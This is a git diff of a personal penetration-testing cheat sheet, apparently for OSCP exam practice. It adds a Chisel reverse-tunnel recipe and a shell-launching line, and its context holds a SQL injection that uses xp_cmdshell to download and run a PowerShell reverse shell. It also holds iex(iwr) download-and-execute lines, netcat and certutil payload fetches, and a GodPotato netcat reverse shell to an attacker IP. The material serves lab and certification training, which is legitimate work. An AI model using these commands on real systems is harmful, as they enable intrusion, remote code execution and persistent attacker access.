@@ -32,6 +32,21 @@ ssh -N -L <your machine>:<your port>:<where \'s running on their machine>:<... p
 ssh -N -L 127.0.0.1:8444:127.0.0.1:8443 nadine@$ip
 ```
 
+Access remote localhost with Chisel:
+
+```bash
+# Remote machine has internal program running on 8080
+chisel server -p 6969 --reverse
+cd /opt/linux
+python -m http.server 80
+
+wget 192.168.45.178/chisel
+chmod 777 chisel
+./chisel client 192.168.68.141:6969 R:4444:localhost:8080
+
+# Now i can access it on local machine port 4444
+```
+
 Elevate privileges of a user you have access to with a single command:
 
 ```bash
@@ -59,7 +74,7 @@ for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executabl
 ```bash
 admin' UNION SELECT 1,2; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.163:8000/rev.ps1") | powershell -noprofile';--+
 
-iex(iwr -uri 192.168.49.140:8000/transfer_files.ps1 -usebasicparsing)
+iex(iwr -uri 192.168.45.178:8000/transfer_files.ps1 -usebasicparsing)
 iex(iwr -uri 10.10.14.8:8000/transfer_files.ps1 -usebasicparsing)
 curl 10.10.14.8:8000/nc.exe -o nc.exe
 
@@ -78,6 +93,8 @@ certutil.exe -f -urlcache -split http://192.168.45.187:8000/
 .\PrintSpoofer64.exe -i -c C:\Windows\Tasks\binary.exe
 
 .\GodPotato-NET2.exe -cmd ".\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.163 6969"
+
+Start-Process -NoNewWindow .\shell443.exe
 
 Start-Process "$env:windir\system32\mstsc.exe" -ArgumentList "/v:ms01.oscp.exam"
 
